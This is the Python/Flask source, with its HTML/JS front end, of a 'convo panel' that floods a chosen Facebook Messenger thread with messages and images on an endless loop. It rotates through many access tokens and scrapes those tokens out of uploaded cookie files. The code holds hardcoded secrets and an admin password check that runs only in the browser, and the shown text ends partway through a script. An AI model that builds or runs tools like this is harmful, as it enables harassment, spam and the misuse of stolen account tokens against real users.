from flask import Flask, request, render_template_string, jsonify
import requests
from threading import Thread, Event
import time
import random
import string
from datetime import datetime
import json
import os

app = Flask(__name__)
app.secret_key = 'AAHAN_ULTRA_VIP_2024'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

# Global variables for task management
stop_events = {}
threads = {}
sent_messages = {}
active_tasks = {}
admin_password = "Aa@1234567"

# Updated headers
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9',
}

def send_messages(access_tokens, thread_id, prefix, time_interval, messages, task_id, image_data=None):
    """Main function to send messages with error handling"""
    stop_event = stop_events[task_id]
    sent_messages[task_id] = []
    
    # Validate and clean tokens
    access_tokens = [token.strip() for token in access_tokens if token.strip()]
    if not access_tokens:
        active_tasks[task_id]['status'] = 'error'
        active_tasks[task_id]['error'] = 'No valid tokens provided'
        return
    
    # Store task info
    active_tasks[task_id] = {
        'thread_id': thread_id,
        'sender_name': prefix,
        'time_interval': time_interval,
        'total_messages': len(messages),
        'start_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running',
        'tokens': [token[:8] + '...' + token[-4:] if len(token) > 12 else token for token in access_tokens],
        'message_type': 'Text + Image' if image_data else 'Text Only',
        'sent_count': 0,
        'failed_count': 0
    }
    
    message_count = 0
    failed_count = 0
    token_index = 0
    
    while not stop_event.is_set():
        for message_text in messages:
            if stop_event.is_set():
                break
                
            # Rotate through tokens
            access_token = access_tokens[token_index % len(access_tokens)]
            token_index += 1
            
            # Prepare message
            full_message = f"{prefix} {message_text}".strip() if prefix else message_text
            
            try:
                # Facebook Graph API endpoint
                api_url = f'https://graph.facebook.com/v19.0/t_{thread_id}/messages'
                
                if image_data:
                    files = {'source': ('image.jpg', image_data, 'image/jpeg')}
                    data = {'access_token': access_token, 'message': full_message}
                    response = requests.post(api_url, files=files, data=data, headers=headers, timeout=30)
                else:
                    data = {'access_token': access_token, 'message': full_message}
                    response = requests.post(api_url, data=data, headers=headers, timeout=30)
                
                timestamp = datetime.now().strftime("%H:%M:%S")
                
                if response.status_code == 200:
                    status = "success"
                    message_count += 1
                else:
                    status = "failed"
                    failed_count += 1
                    error_msg = response.json().get('error', {}).get('message', 'Unknown error')
                
                # Store message info
                message_info = {
                    'timestamp': timestamp,
                    'token': access_token[:8] + '...' + access_token[-4:] if len(access_token) > 12 else access_token,
                    'message': full_message[:100] + '...' if len(full_message) > 100 else full_message,
                    'status': status,
                    'task_id': task_id,
                    'type': 'Image + Text' if image_data else 'Text',
                    'error': error_msg if status == 'failed' else None
                }
                
                sent_messages[task_id].append(message_info)
                
                # Keep only last 100 messages
                if len(sent_messages[task_id]) > 100:
                    sent_messages[task_id] = sent_messages[task_id][-100:]
                    
                # Update task info
                active_tasks[task_id]['sent_count'] = message_count
                active_tasks[task_id]['failed_count'] = failed_count
                active_tasks[task_id]['last_activity'] = timestamp
                    
            except Exception as e:
                timestamp = datetime.now().strftime("%H:%M:%S")
                failed_count += 1
                error_str = str(e)
                message_info = {
                    'timestamp': timestamp,
                    'token': access_token[:8] + '...',
                    'message': full_message[:100] + '...' if len(full_message) > 100 else full_message,
                    'status': 'error',
                    'task_id': task_id,
                    'type': 'Image + Text' if image_data else 'Text',
                    'error': error_str[:100]
                }
                sent_messages[task_id].append(message_info)
            
            # Delay between messages
            if not stop_event.is_set():
                time.sleep(time_interval)
    
    # Mark task as stopped
    active_tasks[task_id]['status'] = 'stopped'
    active_tasks[task_id]['end_time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def extract_tokens_from_cookies(cookies_content):
    """Extract access tokens from cookies file"""
    tokens = []
    try:
        lines = cookies_content.split('\n')
        for line in lines:
            line = line.strip()
            if line and ('EAAB' in line.upper() or 'EAAY' in line.upper()):
                import re
                token_matches = re.findall(r'EAAB[0-9A-Za-z]{100,}', line.upper())
                tokens.extend(token_matches)
                alt_tokens = re.findall(r'EAAY[0-9A-Za-z]{100,}', line.upper())
                tokens.extend(alt_tokens)
    except Exception as e:
        print(f"Error extracting tokens from cookies: {e}")
    
    return list(set(tokens))

def cleanup_old_tasks():
    """Remove old completed tasks to free memory"""
    try:
        current_time = datetime.now()
        tasks_to_remove = []
        
        for task_id, task_info in active_tasks.items():
            if task_info['status'] == 'stopped':
                end_time = datetime.strptime(task_info.get('end_time', task_info['start_time']), "%Y-%m-%d %H:%M:%S")
                if (current_time - end_time).total_seconds() > 3600:
                    tasks_to_remove.append(task_id)
        
        for task_id in tasks_to_remove:
            if task_id in active_tasks: del active_tasks[task_id]
            if task_id in sent_messages: del sent_messages[task_id]
            if task_id in stop_events: del stop_events[task_id]
            if task_id in threads: del threads[task_id]
                
    except Exception as e:
        print(f"Error cleaning up old tasks: {e}")

@app.route('/', methods=['GET', 'POST'])
def send_message():
    """Main route with improved error handling"""
    cleanup_old_tasks()
    
    if request.method == 'POST':
        try:
            # Get form data
            auth_method = request.form.get('authMethod', 'token')
            thread_id = request.form.get('threadId', '').strip()
            prefix = request.form.get('kidx', '').strip()
            time_interval = max(int(request.form.get('time', 10)), 5)
            
            if not thread_id:
                return jsonify({'error': 'Thread ID is required'}), 400
            
            # Handle file uploads
            if 'txtFile' not in request.files:
                return jsonify({'error': 'Messages file is required'}), 400
                
            txt_file = request.files['txtFile']
            if txt_file.filename == '':
                return jsonify({'error': 'No messages file selected'}), 400
            
            # Read messages
            try:
                messages_content = txt_file.read().decode('utf-8')
                messages = [msg.strip() for msg in messages_content.splitlines() if msg.strip()]
            except Exception as e:
                return jsonify({'error': f'Error reading messages file: {str(e)}'}), 400
            
            if not messages:
                return jsonify({'error': 'No valid messages found in file'}), 400
            
            # Handle authentication
            access_tokens = []
            if auth_method == 'cookies':
                if 'cookieFile' not in request.files:
                    return jsonify({'error': 'Cookie file is required for cookies method'}), 400
                
                cookie_file = request.files['cookieFile']
                if cookie_file.filename == '':
                    return jsonify({'error': 'No cookie file selected'}), 400
                
                try:
                    cookies_content = cookie_file.read().decode('utf-8')
                    access_tokens = extract_tokens_from_cookies(cookies_content)
                except Exception as e:
                    return jsonify({'error': f'Error reading cookie file: {str(e)}'}), 400
                    
            else:
                token_option = request.form.get('tokenOption', 'single')
                
                if token_option == 'single':
                    single_token = request.form.get('singleToken', '').strip()
                    if not single_token:
                        return jsonify({'error': 'Access token is required'}), 400
                    access_tokens = [single_token]
                else:
                    if 'tokenFile' not in request.files:
                        return jsonify({'error': 'Token file is required for multiple tokens'}), 400
                    
                    token_file = request.files['tokenFile']
                    if token_file.filename == '':
                        return jsonify({'error': 'No token file selected'}), 400
                    
                    try:
                        tokens_content = token_file.read().decode('utf-8')
                        access_tokens = [token.strip() for token in tokens_content.splitlines() if token.strip()]
                    except Exception as e:
                        return jsonify({'error': f'Error reading token file: {str(e)}'}), 400
            
            if not access_tokens:
                return jsonify({'error': 'No valid access tokens/cookies found'}), 400
            
            # Handle image upload
            image_data = None
            if 'imageFile' in request.files:
                image_file = request.files['imageFile']
                if image_file.filename != '':
                    try:
                        image_data = image_file.read()
                        if len(image_data) > 10 * 1024 * 1024:
                            return jsonify({'error': 'Image file too large (max 10MB)'}), 400
                    except Exception as e:
                        return jsonify({'error': f'Error reading image file: {str(e)}'}), 400

            # Create task
            task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
            
            stop_events[task_id] = Event()
            
            thread = Thread(
                target=send_messages, 
                args=(access_tokens, thread_id, prefix, time_interval, messages, task_id, image_data),
                daemon=True
            )
            threads[task_id] = thread
            thread.start()
            
            return jsonify({
                'success': True,
                'task_id': task_id,
                'message': f'🔥 TASK LAUNCHED SUCCESSFULLY! ID: {task_id}'
            })
            
        except Exception as e:
            return jsonify({'error': f'Internal server error: {str(e)}'}), 500

    return render_template_string(ULTRA_VIP_TEMPLATE)

@app.route('/admin/tasks')
def get_tasks():
    """Get all active tasks for admin panel"""
    try:
        cleanup_old_tasks()
        return jsonify(active_tasks)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/messages')
def get_messages():
    """Get recent messages for display"""
    try:
        all_messages = []
        for task_messages in sent_messages.values():
            all_messages.extend(task_messages)
        
        all_messages.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
        return jsonify(all_messages[:50])
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/stop/<task_id>')
def stop_task(task_id):
    """Stop a specific task"""
    try:
        if task_id in stop_events:
            stop_events[task_id].set()
            return jsonify({'status': 'success', 'message': f'Task {task_id} stopped successfully'})
        else:
            return jsonify({'status': 'error', 'message': 'Task not found'}), 404
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/stop_all')
def stop_all_tasks():
    """Stop all running tasks"""
    try:
        stopped_count = 0
        for task_id in list(stop_events.keys()):
            stop_events[task_id].set()
            stopped_count += 1
        
        return jsonify({'status': 'success', 'message': f'Stopped {stopped_count} tasks'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

# ULTRA VIP TEMPLATE - NEXT LEVEL DESIGN
ULTRA_VIP_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AAHAN CONVO PANEL | AAHAN VIP</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;500;600;700&family=Exo+2:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --quantum-blue: #00f5ff;
            --quantum-purple: #9d4edd;
            --quantum-pink: #ff00ff;
            --quantum-cyan: #00ffea;
            --quantum-dark: #0a0a1f;
            --quantum-darker: #050510;
            --quantum-glow: #00f5ff;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, var(--quantum-darker) 0%, var(--quantum-dark) 50%, #1a1a2e 100%);
            color: white;
            font-family: 'Exo 2', sans-serif;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Quantum Background Effects */
        .quantum-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -2;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 245, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(157, 78, 221, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(255, 0, 255, 0.05) 0%, transparent 50%);
        }
        
        .quantum-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            pointer-events: none;
        }
        
        .quantum-grid {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 245, 255, 0.1) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 245, 255, 0.1) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: -1;
            opacity: 0.3;
        }
        
        .quantum-header {
            text-align: center;
            padding: 4rem 0 3rem;
            position: relative;
            background: linear-gradient(180deg, rgba(10, 10, 31, 0.9) 0%, transparent 100%);
        }
        
        .main-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 4.5rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--quantum-blue), var(--quantum-cyan), var(--quantum-pink), var(--quantum-purple));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 50px rgba(0, 245, 255, 0.5);
            margin-bottom: 1rem;
            letter-spacing: 4px;
            animation: titleGlow 3s ease-in-out infinite alternate;
        }
        
        @keyframes titleGlow {
            0% { text-shadow: 0 0 30px rgba(0, 245, 255, 0.5), 0 0 60px rgba(157, 78, 221, 0.3); }
            100% { text-shadow: 0 0 50px rgba(0, 245, 255, 0.8), 0 0 100px rgba(157, 78, 221, 0.5); }
        }
        
        .subtitle {
            font-size: 1.4rem;
            color: var(--quantum-cyan);
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 3px;
            text-shadow: 0 0 20px var(--quantum-glow);
        }
        
        .quantum-card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 245, 255, 0.3);
            border-radius: 20px;
            padding: 2.5rem;
            margin-bottom: 2rem;
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 32px 0 rgba(0, 245, 255, 0.1);
            transition: all 0.3s ease;
        }
        
        .quantum-card::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, var(--quantum-blue), var(--quantum-purple), var(--quantum-pink), var(--quantum-cyan));
            border-radius: 22px;
            z-index: -1;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .quantum-card:hover::before {
            opacity: 1;
        }
        
        .quantum-card::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, var(--quantum-cyan), transparent);
            animation: scanLine 3s linear infinite;
        }
        
        @keyframes scanLine {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }
        
        .panel-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 2rem;
            color: var(--quantum-cyan);
            margin-bottom: 2rem;
            text-align: center;
            text-shadow: 0 0 15px var(--quantum-glow);
            position: relative;
        }
        
        .panel-title::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 100px;
            height: 3px;
            background: linear-gradient(90deg, transparent, var(--quantum-cyan), transparent);
        }
        
        .form-label {
            color: var(--quantum-cyan);
            font-weight: 600;
            margin-bottom: 0.8rem;
            font-size: 1.1rem;
            text-shadow: 0 0 10px rgba(0, 245, 255, 0.5);
        }
        
        .quantum-input {
            background: rgba(0, 245, 255, 0.1) !important;
            border: 2px solid rgba(0, 245, 255, 0.3) !important;
            color: white !important;
            border-radius: 12px;
            padding: 1rem 1.2rem;
            transition: all 0.3s ease;
            font-family: 'Exo 2', sans-serif;
            backdrop-filter: blur(10px);
        }
        
        .quantum-input:focus {
            background: rgba(0, 245, 255, 0.15) !important;
            border-color: var(--quantum-cyan) !important;
            box-shadow: 0 0 25px rgba(0, 245, 255, 0.3) !important;
            color: white !important;
        }
        
        .quantum-input::placeholder {
            color: rgba(255, 255, 255, 0.6) !important;
        }
        
        .quantum-btn {
            background: linear-gradient(135deg, var(--quantum-purple), var(--quantum-pink));
            border: none;
            border-radius: 15px;
            padding: 1.2rem 2.5rem;
            font-size: 1.3rem;
            font-weight: 700;
            color: white;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 1px;
            text-transform: uppercase;
            box-shadow: 0 5px 25px rgba(157, 78, 221, 0.4);
        }
        
        .quantum-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            transition: 0.5s;
        }
        
        .quantum-btn:hover::before {
            left: 100%;
        }
        
        .quantum-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 35px rgba(157, 78, 221, 0.6);
            background: linear-gradient(135deg, var(--quantum-pink), var(--quantum-purple));
        }
        
        .quantum-btn-stop {
            background: linear-gradient(135deg, #ff416c, #ff4b2b);
            box-shadow: 0 5px 25px rgba(255, 65, 108, 0.4);
        }
        
        .quantum-btn-stop:hover {
            box-shadow: 0 10px 35px rgba(255, 65, 108, 0.6);
            background: linear-gradient(135deg, #ff4b2b, #ff416c);
        }
        
        .method-selector {
            display: flex;
            gap: 1rem;
            margin-bottom: 2rem;
            justify-content: center;
        }
        
        .method-btn {
            flex: 1;
            padding: 1rem 2rem;
            background: rgba(0, 245, 255, 0.1);
            border: 2px solid rgba(0, 245, 255, 0.3);
            border-radius: 12px;
            color: var(--quantum-cyan);
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-align: center;
            font-family: 'Orbitron', sans-serif;
        }
        
        .method-btn.active {
            background: linear-gradient(135deg, var(--quantum-blue), var(--quantum-cyan));
            border-color: var(--quantum-cyan);
            color: var(--quantum-dark);
            box-shadow: 0 0 20px rgba(0, 245, 255, 0.5);
        }
        
        .quantum-messages {
            background: rgba(0, 245, 255, 0.05);
            border: 1px solid rgba(0, 245, 255, 0.2);
            border-radius: 15px;
            padding: 1.5rem;
            max-height: 400px;
            overflow-y: auto;
            margin-top: 1rem;
        }
        
        .message-item {
            background: rgba(0, 245, 255, 0.1);
            border-left: 4px solid var(--quantum-cyan);
            border-radius: 10px;
            padding: 1rem;
            margin-bottom: 0.8rem;
            transition: all 0.3s ease;
            backdrop-filter: blur(10px);
        }
        
        .message-item:hover {
            background: rgba(0, 245, 255, 0.15);
            transform: translateX(5px);
        }
        
        .message-success {
            border-left-color: #00ff88;
        }
        
        .message-failed {
            border-left-color: #ff4444;
        }
        
        .message-header {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
            font-size: 0.9rem;
        }
        
        .message-time {
            color: var(--quantum-cyan);
            font-weight: 600;
        }
        
        .message-token {
            color: var(--quantum-pink);
        }
        
        .message-status {
            font-weight: 700;
            margin-top: 0.5rem;
            font-size: 0.9rem;
        }
        
        .status-success {
            color: #00ff88;
        }
        
        .status-failed {
            color: #ff4444;
        }
        
        .task-card {
            background: rgba(0, 245, 255, 0.1);
            border: 1px solid rgba(0, 245, 255, 0.3);
            border-radius: 12px;
            padding: 1.2rem;
            margin-bottom: 1rem;
            backdrop-filter: blur(10px);
        }
        
        .task-running {
            border-left: 4px solid #00ff88;
        }
        
        .task-stopped {
            border-left: 4px solid #ff4444;
        }
        
        .quantum-alert {
            background: rgba(0, 245, 255, 0.1);
            border: 1px solid var(--quantum-cyan);
            border-radius: 12px;
            padding: 1.2rem;
            margin: 1rem 0;
            color: var(--quantum-cyan);
            backdrop-filter: blur(10px);
        }
        
        .quantum-alert-error {
            background: rgba(255, 68, 68, 0.1);
            border-color: #ff4444;
            color: #ff4444;
        }
        
        .vip-badge {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: linear-gradient(45deg, var(--quantum-pink), var(--quantum-purple));
            color: white;
            padding: 0.5rem 1.5rem;
            border-radius: 20px;
            font-weight: 700;
            font-size: 0.9rem;
            font-family: 'Orbitron', sans-serif;
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.5);
        }
        
        .quantum-footer {
            text-align: center;
            padding: 3rem 0;
            margin-top: 3rem;
            border-top: 1px solid rgba(0, 245, 255, 0.2);
            color: var(--quantum-cyan);
            font-family: 'Orbitron', sans-serif;
        }
        
        .floating {
            animation: floating 3s ease-in-out infinite;
        }
        
        @keyframes floating {
            0% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
            100% { transform: translateY(0px); }
        }
        
        /* Custom scrollbar */
        .quantum-messages::-webkit-scrollbar {
            width: 8px;
        }
        
        .quantum-messages::-webkit-scrollbar-track {
            background: rgba(0, 245, 255, 0.1);
            border-radius: 10px;
        }
        
        .quantum-messages::-webkit-scrollbar-thumb {
            background: var(--quantum-cyan);
            border-radius: 10px;
        }
        
        .quantum-messages::-webkit-scrollbar-thumb:hover {
            background: var(--quantum-blue);
        }
        
        @media (max-width: 768px) {
            .main-title {
                font-size: 2.8rem;
            }
            
            .quantum-card {
                padding: 1.5rem;
            }
            
            .method-selector {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="quantum-bg"></div>
    <div class="quantum-grid"></div>
    <div class="quantum-particles" id="quantumParticles"></div>
    
    <div class="container py-4">
        <div class="quantum-header floating">
            <h1 class="main-title">AAHAN CONVO PANEL</h1>
            <div class="subtitle">AAHAN ULTRA VIP MESSAGE SYSTEM</div>
        </div>
        
        <div id="alertContainer"></div>
        
        <!-- Main Control Panel -->
        <div class="quantum-card">
            <div class="vip-badge">ONLINE</div>
            <h3 class="panel-title">PANEL CONTROL CENTER</h3>
            
            <form id="mainForm" method="post" enctype="multipart/form-data">
                <div class="row">
                    <div class="col-md-6">
                        <!-- Authentication Section -->
                        <div class="mb-4">
                            <label class="form-label">AUTHENTICATION PROTOCOL</label>
                            
                            <div class="method-selector">
                                <div class="method-btn active" onclick="setAuthMethod('token')">
                                    <i class="fas fa-key"></i> TOKEN AUTH
                                </div>
                                <div class="method-btn" onclick="setAuthMethod('cookies')">
                                    <i class="fas fa-shield-alt"></i> COOKIES AUTH
                                </div>
                            </div>
                            <input type="hidden" name="authMethod" id="authMethod" value="token">
                            
                            <div id="tokenMethod">
                                <div class="mb-3">
                                    <label class="form-label">TOKEN CONFIGURATION</label>
                                    <select class="quantum-input form-select" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
                                        <option value="single">Single Token</option>
                                        <option value="multiple">Token File</option>
                                    </select>
                                </div>
                                
                                <div class="mb-3" id="singleTokenInput">
                                    <label class="form-label">ACCESS TOKEN</label>
                                    <input type="text" class="quantum-input form-control" name="singleToken" placeholder="Enter Quantum Access Token">
                                </div>
                                
                                <div class="mb-3 d-none" id="tokenFileInput">
                                    <label class="form-label">TOKEN FILE</label>
                                    <input type="file" class="quantum-input form-control" name="tokenFile" accept=".txt">
                                </div>
                            </div>
                            
                            <div id="cookiesMethod" class="d-none">
                                <div class="mb-3">
                                    <label class="form-label">COOKIES FILE</label>
                                    <input type="file" class="quantum-input form-control" name="cookieFile" accept=".txt">
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="col-md-6">
                        <!-- Mission Configuration -->
                        <div class="mb-4">
                            <label class="form-label">MISSION PARAMETERS</label>
                            
                            <div class="mb-3">
                                <label class="form-label">TARGET THREAD ID</label>
                                <input type="text" class="quantum-input form-control" name="threadId" placeholder="Enter Target Thread ID" required>
                            </div>
                            
                            <div class="mb-3">
                                <label class="form-label">MESSAGE PREFIX</label>
                                <input type="text" class="quantum-input form-control" name="kidx" placeholder="Optional Message Prefix">
                            </div>
                            
                            <div class="mb-3">
                                <label class="form-label">TIME INTERVAL (SECONDS)</label>
                                <input type="number" class="quantum-input form-control" name="time" min="5" value="10" required>
                            </div>
                            
                            <div class="mb-3">
                                <label class="form-label">MESSAGES FILE</label>
                                <input type="file" class="quantum-input form-control" name="txtFile" accept=".txt" required>
                            </div>
                            
                            <div class="mb-3">
                                <label class="form-label">MEDIA FILE (OPTIONAL)</label>
                                <input type="file" class="quantum-input form-control" name="imageFile" accept="image/*">
                            </div>
                        </div>
                    </div>
                </div>
                
                <button type="submit" class="quantum-btn w-100">
                    <i class="fas fa-rocket"></i> LAUNCH MISSION
                </button>
            </form>
        </div>
        
        <!-- Admin Control Panel -->
        <div class="quantum-card">
            <h3 class="panel-title">AAHAN ADMIN PANEL</h3>
            
            <div class="mb-3">
                <label class="form-label">ADMIN ACCESS CODE</label>
                <input type="password" class="quantum-input form-control" id="adminPassword" placeholder="Enter Quantum Access Code">
                <button class="quantum-btn quantum-btn-stop w-100 mt-3" onclick="loadAdminPanel()">
                    <i class="fas fa-user-shield"></i> ACCESS PANEL CONTROL
                </button>
            </div>
            
            <div id="adminContent" class="d-none">
                <div id="tasksContainer"></div>
                <button class="quantum-btn quantum-btn-stop w-100 mt-3" onclick="stopAllTasks()">
                    <i class="fas fa-stop-circle"></i> EMERGENCY SHUTDOWN ALL
                </button>
            </div>
        </div>
        
        <!-- Live Activity Feed -->
        <div class="quantum-card">
            <h3 class="panel-title">PANEL ACTIVITY FEED</h3>
            <div class="quantum-messages" id="messagesContainer">
                <div class="text-center text-muted">No quantum activity detected. Launch a mission to see live feed.</div>
            </div>
            <button class="quantum-btn w-100 mt-3" onclick="loadMessages()">
                <i class="fas fa-sync-alt"></i> REFRESH PANEL FEED
            </button>
        </div>
    </div>
    
    <div class="quantum-footer">
        <div class="container">
            <h4>AAHAN CONVO PANEL</h4>
            <p>AAHAN ULTRA VIP MESSAGE PLATFORM</p>
            <div class="mt-2">
                <small>Powered by Quantum Technology | Built for Elite Users</small>
            </div>
        </div>
    </div>

    <script>
        // Create quantum particles
        function createQuantumParticles() {
            const container = document.getElementById('quantumParticles');
            const colors = ['#00f5ff', '#9d4edd', '#ff00ff', '#00ffea'];
            
            for(let i = 0; i < 30; i++) {
                const particle = document.createElement('div');
                particle.style.position = 'fixed';
                particle.style.width = Math.random() * 6 + 2 + 'px';
                particle.style.height = particle.style.width;
                particle.style.background = colors[Math.floor(Math.random() * colors.length)];
                particle.style.borderRadius = '50%';
                particle.style.top = Math.random() * 100 + 'vh';
                particle.style.left = Math.random() * 100 + 'vw';
                particle.style.opacity = Math.random() * 0.6 + 0.2;
                particle.style.zIndex = '-1';
                particle.style.pointerEvents = 'none';
                particle.style.boxShadow = `0 0 ${Math.random() * 15 + 5}px currentColor`;
                particle.style.filter = 'blur(1px)';
                
                container.appendChild(particle);
                animateParticle(particle);
            }
        }
        
        function animateParticle(element) {
            let x = parseFloat(element.style.left);
            let y = parseFloat(element.style.top);
            let xSpeed = (Math.random() - 0.5) * 0.4;
            let ySpeed = (Math.random() - 0.5) * 0.4;
            
            function move() {
                x += xSpeed;
                y += ySpeed;
                
                if(x < 0 || x > 100) xSpeed *= -1;
                if(y < 0 || y > 100) ySpeed *= -1;
                
                element.style.left = x + 'vw';
                element.style.top = y + 'vh';
                
                requestAnimationFrame(move);
            }
            move();
        }
        
        // Auth method toggle
        function setAuthMethod(method) {
            document.getElementById('authMethod').value = method;
            
            document.querySelectorAll('.method-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            
            event.target.classList.add('active');
            
            if(method === 'token') {
                document.getElementById('tokenMethod').classList.remove('d-none');
                document.getElementById('cookiesMethod').classList.add('d-none');
            } else {
                document.getElementById('tokenMethod').classList.add('d-none');
                document.getElementById('cookiesMethod').classList.remove('d-none');
            }
        }
        
        // Token input toggle
        function toggleTokenInput() {
            const tokenOption = document.getElementById('tokenOption').value;
            if(tokenOption === 'single') {
                document.getElementById('singleTokenInput').classList.remove('d-none');
                document.getElementById('tokenFileInput').classList.add('d-none');
            } else {
                document.getElementById('singleTokenInput').classList.add('d-none');
                document.getElementById('tokenFileInput').classList.remove('d-none');
            }
        }
        
        // Form submission with AJAX
        document.getElementById('mainForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const formData = new FormData(this);
            const alertContainer = document.getElementById('alertContainer');
            
            fetch('/', {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if(data.success) {
                    alertContainer.innerHTML = `
                        <div class="quantum-alert">
                            <i class="fas fa-check-circle"></i> ${data.message}
                        </div>
                    `;
                    document.getElementById('mainForm').reset();
                    toggleTokenInput();
                } else {
                    alertContainer.innerHTML = `
                        <div class="quantum-alert quantum-alert-error">
                            <i class="fas fa-exclamation-triangle"></i> ${data.error}
                        </div>
                    `;
                }
            })
            .catch(error => {
                alertContainer.innerHTML = `
                    <div class="quantum-alert quantum-alert-error">
                        <i class="fas fa-times-circle"></i> Network Error: ${error}
                    </div>
                `;
            });
        });
        
        // Load admin panel
        function loadAdminPanel() {
            const password = document.getElementById('adminPassword').value;
            if(password === 'AAHAN@2024') {
                document.getElementById('adminContent').classList.remove('d-none');
                loadTasks();
            } else {
                alert('Invalid quantum access code!');
            }
        }
        
        // Load tasks for admin panel
        function loadTasks() {
            fetch('/admin/tasks')
                .then(response => response.json())
                .then(tasks => {
                    const container = document.getElementById('tasksContainer');
                    container.innerHTML = '';
                    
                    if(Object.keys(tasks).length === 0) {
                        container.innerHTML = '<div class="text-center text-muted">No active quantum missions</div>';
                        return;
                    }
                    
                    for(const [taskId, task] of Object.entries(tasks)) {
                        const statusClass = task.status === 'running' ? 'task-running' : 'task-stopped';
                        const statusIcon = task.status === 'running' ? 'fa-play' : 'fa-stop';
                        
                        const taskCard = document.createElement('div');
                        taskCard.className = `task-card ${statusClass}`;
                        taskCard.innerHTML = `
                            <div class="row">
                                <div class="col-md-8">
                                    <h6><i class="fas ${statusIcon}"></i> MISSION: ${taskId}</h6>
                                    <div class="row">
                                        <div class="col-6">
                                            <small><strong>Status:</strong> ${task.status.toUpperCase()}</small>
                                        </div>
                                        <div class="col-6">
                                            <small><strong>Target:</strong> ${task.thread_id}</small>
                                        </div>
                                        <div class="col-6">
                                            <small><strong>Progress:</strong> ${task.sent_count || 0}/${task.total_messages}</small>
                                        </div>
                                        <div class="col-6">
                                            <small><strong>Failed:</strong> ${task.failed_count || 0}</small>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-md-4">
                                    <button class="quantum-btn quantum-btn-stop w-100" onclick="stopTask('${taskId}')">
                                        <i class="fas fa-stop"></i> ABORT MISSION
                                    </button>
                                </div>
                            </div>
                        `;
                        container.appendChild(taskCard);
                    }
                });
        }
        
        // Stop individual task
        function stopTask(taskId) {
            fetch(`/stop/${taskId}`)
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    loadTasks();
                });
        }
        
        // Stop all tasks
        function stopAllTasks() {
            fetch('/stop_all')
                .then(response => response.json())
                .then(data => {
                    alert(data.message);
                    loadTasks();
                });
        }
        
        // Load messages
        function loadMessages() {
            fetch('/messages')
                .then(response => response.json())
                .then(messages => {
                    const container = document.getElementById('messagesContainer');
                    container.innerHTML = '';
                    
                    if(messages.length === 0) {
                        container.innerHTML = '<div class="text-center text-muted">No quantum activity detected</div>';
                        return;
                    }
                    
